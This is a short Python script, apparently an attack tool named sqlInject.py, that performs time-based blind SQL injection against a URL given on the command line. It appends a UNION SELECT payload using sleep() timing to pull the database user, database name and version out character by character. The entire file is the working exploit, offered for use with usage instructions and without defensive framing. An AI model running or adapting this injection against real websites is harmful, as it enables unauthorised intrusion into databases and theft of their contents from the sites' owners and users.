# -*- coding: utf-8 -*-
# @Autor: Diego Rodrigues Pereira
import sys
import string
import time
import datetime
import requests

def main(url):
    print('Loading...')
    print('Start Attack ....')
    payload = list(string.ascii_lowercase)
    payload += ['_', '.', '@', ',', '-']
    payload += [str(num) for num in range(0, 10)]
    maxLength = 30
    exploit = []
    for i in range(maxLength):
        for element in payload:
            t1 = time.time()
            poc = url + " union select if((ord(SUBSTR(concat_ws(' ---- ',user(),database(),version())," + str(i + 1) + ",1))=ord('" + element + "'))=1,sleep(0),sleep(0.5)),2,3"
            response = requests.get(poc)
            if response.status_code == 200:
                t2 = time.time()
                if t2 - t1 < 0.5:
                    exploit.append(element)
                    print(''.join(exploit) + '...')
                    continue
    print('Finish...')

def help():
    print('-----Usage:-----\n')
    print('Example:\npython sqlInject.py -u http://xxx.xxx.com/id=123')

if __name__ == '__main__':
    args = sys.argv
    if len(args) == 3:
        if args[1] == '-u':
            main(args[2])
        else:
            help()
    else:
        help()
